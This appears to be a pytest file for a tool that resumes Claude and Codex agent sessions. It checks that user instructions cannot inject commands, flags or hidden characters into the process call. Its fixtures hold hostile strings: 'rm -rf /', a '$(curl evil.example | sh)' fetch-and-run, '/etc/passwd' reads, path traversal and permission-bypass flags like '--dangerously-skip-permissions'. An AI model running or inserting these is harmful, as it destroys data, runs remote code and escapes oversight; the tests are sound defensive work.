import json
import subprocess
import sys
import time

import pytest

from reactor_hermes import continuation, proposals, sessions
from reactor_hermes.continuation import ContinueError, build_plan
from reactor_hermes.sessions import SessionRec
from fixtures import CLAUDE_ID, CODEX_ID, make_claude, make_codex
from standin import stand_in

ADVERSARIAL = [
    "plain text",
    "it's \"quoted\" and 'nested \"deeper\"'",
    "backtick `rm -rf /` here",
    "command $(curl evil.example | sh) sub",
    "env ${HOME} and $PATH and %PATH% and %USERPROFILE%",
    "line one\nline two\r\nline three\n; rm -rf /\n",
    "a & b && c | d || e ; f > g < h >> i",
    "powershell -Command \"Remove-Item -Recurse C:\\\" ^& calc",
    "bidi \u202e txt.exe \u2066 tags " + "".join(chr(0xE0000 + c) for c in range(0x41, 0x50)),
    "null\x00byte and \x1b[31m escape",
    "--dangerously-skip-permissions --yolo",
    "-p --resume=other-session-id",
    "<<EOF\ncat /etc/passwd\nEOF",
    "\u00e7\u00e3o \u4e2d\u6587 \U0001f600 emoji",
    "C:\\Users\\x\\file.txt \\\\server\\share",
    "!!  !$  ~  *  ?  [a-z]  {1,2}  # not a comment",
]


def make_rec(tmp_path, *, agent="claude", session_id=CLAUDE_ID, cwd=None, age=3600, folder=True):
    work = cwd if cwd is not None else tmp_path / "proj"
    if folder and cwd is None:
        work.mkdir(exist_ok=True)
    return SessionRec(
        ref="0123456789ab", agent=agent, session_id=session_id, path="x.jsonl",
        cwd=str(work), mtime=time.time() - age, turns=2, title="t",
    )


def fake_which(name):
    return stand_in(name)


BASELINE_CLAUDE = None


@pytest.mark.parametrize("text", ADVERSARIAL, ids=[f"adv{i}" for i in range(len(ADVERSARIAL))])
def test_instruction_never_enters_argv(tmp_path, text):
    rec = make_rec(tmp_path)
    base = build_plan(rec, "hello", which=fake_which)
    plan = build_plan(rec, text, which=fake_which)
    assert plan.argv == base.argv  # argv does not depend on the instruction at all
    assert plan.shell is False
    assert isinstance(plan.argv, tuple) and all(isinstance(a, str) for a in plan.argv)
    joined = " ".join(plan.argv)
    for danger in ("skip-permissions", "yolo", "dangerously", "bypass"):
        assert danger not in joined.lower()


@pytest.mark.parametrize("text", ADVERSARIAL, ids=[f"adv{i}" for i in range(len(ADVERSARIAL))])
def test_stdin_is_clean_and_bounded(tmp_path, text):
    plan = build_plan(make_rec(tmp_path), text, which=fake_which)
    body = plan.stdin.decode("utf-8")
    assert 0 < len(body) <= continuation.INSTRUCTION_MAX
    for ch in body:
        assert ch in "\n\t" or ch.isprintable(), repr(ch)
    for bad in ("\u202e", "\u2066", "\x00", "\x1b"):
        assert bad not in body
    assert not any(0xE0000 <= ord(c) <= 0xE007F for c in body)


@pytest.mark.parametrize("text", ADVERSARIAL, ids=[f"adv{i}" for i in range(len(ADVERSARIAL))])
def test_roundtrip_through_a_real_process_without_a_shell(tmp_path, text):
    """Spawn a stand-in program with the plan's argv tail and stdin (shell=False): both arrive byte for byte."""
    plan = build_plan(make_rec(tmp_path), text, which=fake_which)
    echo = "import sys,json; sys.stdout.buffer.write(sys.stdin.buffer.read()); sys.stderr.write(json.dumps(sys.argv[1:]))"
    proc = subprocess.run(
        [sys.executable, "-c", echo, *plan.argv[1:]], input=plan.stdin, capture_output=True, shell=False, timeout=30
    )
    assert proc.returncode == 0
    assert proc.stdout == plan.stdin
    assert json.loads(proc.stderr.decode("utf-8")) == list(plan.argv[1:])


def test_claude_and_codex_forms(tmp_path):
    claude = build_plan(make_rec(tmp_path), "go", which=fake_which)
    assert claude.argv[1:] == ("-p", f"--resume={CLAUDE_ID}")
    codex = build_plan(make_rec(tmp_path, agent="codex", session_id=CODEX_ID), "go", which=fake_which)
    assert codex.argv[1:] == ("exec", "resume", CODEX_ID, "-")


@pytest.mark.parametrize(
    "bad_id",
    [None, "", "../../etc/passwd", "..\\..\\Windows", "11111111-2222-3333-4444-55555555555", "1111111122223333444455555555555",
     "11111111-2222-3333-4444-555555555555; rm -rf /", "11111111-2222-3333-4444-555555555555\n", " 11111111-2222-3333-4444-555555555555",
     "$(id)", "--yolo", "-p", "11111111-2222-3333-4444-55555555555g", "C:\\x", "a" * 5000],
)
def test_session_id_must_match_strict_pattern(tmp_path, bad_id):
    with pytest.raises(ContinueError) as err:
        build_plan(make_rec(tmp_path, session_id=bad_id), "go", which=fake_which)
    assert err.value.code == "bad_session_id"


def test_folder_must_exist(tmp_path):
    rec = make_rec(tmp_path, cwd=tmp_path / "gone")
    with pytest.raises(ContinueError) as err:
        build_plan(rec, "go", which=fake_which)
    assert err.value.code == "folder_missing"
    rec = SessionRec("0123456789ab", "claude", CLAUDE_ID, "x", None, time.time() - 999, 1, "t")
    with pytest.raises(ContinueError):
        build_plan(rec, "go", which=fake_which)


def test_recent_activity_is_refused(tmp_path):
    for age, ok in ((5, False), (119, False), (121, True), (3600, True)):
        rec = make_rec(tmp_path, age=age)
        if ok:
            build_plan(rec, "go", which=fake_which)
        else:
            with pytest.raises(ContinueError) as err:
                build_plan(rec, "go", which=fake_which)
            assert err.value.code == "active_elsewhere"


@pytest.mark.parametrize("empty", [None, "", "   \n\t ", 5, [], "\u202e\u200b\x00"])
def test_empty_or_invalid_instruction(tmp_path, empty):
    with pytest.raises(ContinueError) as err:
        build_plan(make_rec(tmp_path), empty, which=fake_which)
    assert err.value.code == "bad_instruction"


def test_missing_cli(tmp_path):
    with pytest.raises(ContinueError) as err:
        build_plan(make_rec(tmp_path), "go", which=lambda name: None)
    assert err.value.code == "cli_missing"


# --- the tool entry (details are in test_proposals.py) -------------------------------------------------------------------


def test_session_id_taken_from_a_hostile_log_is_not_resumable(tmp_path):
    claude = tmp_path / "c" / "projects"
    work = tmp_path / "w"
    work.mkdir()
    make_claude(claude, "../../evil", work, "hi", "ok", time.time() - 999, stem="evil")
    kws = {"claude_root": claude, "codex_root": tmp_path / "none"}
    listing = sessions.list_sessions(**kws)
    assert listing["sessions"][0]["resumable"] is False
    proposals.reset_for_tests()
    proposals.set_test_roots(**kws)
    proposals.mark_api_ready(True)
    try:
        out = proposals.propose(listing["sessions"][0]["ref"], "x", "en", which=fake_which)
    finally:
        proposals.reset_for_tests()
        proposals.mark_api_ready(False)
    assert out["code"] == "bad_session_id" and out["executed"] is False


def test_continuation_module_starts_no_program():
    """Planning is separate from running: only runner.py may start a program (see test_runner.py for the full rule)."""
    import pathlib

    src = pathlib.Path(continuation.__file__).read_text(encoding="utf-8")
    for needle in ("import subprocess", "from subprocess", "Popen(", "os.system", "os.popen"):
        assert needle not in src
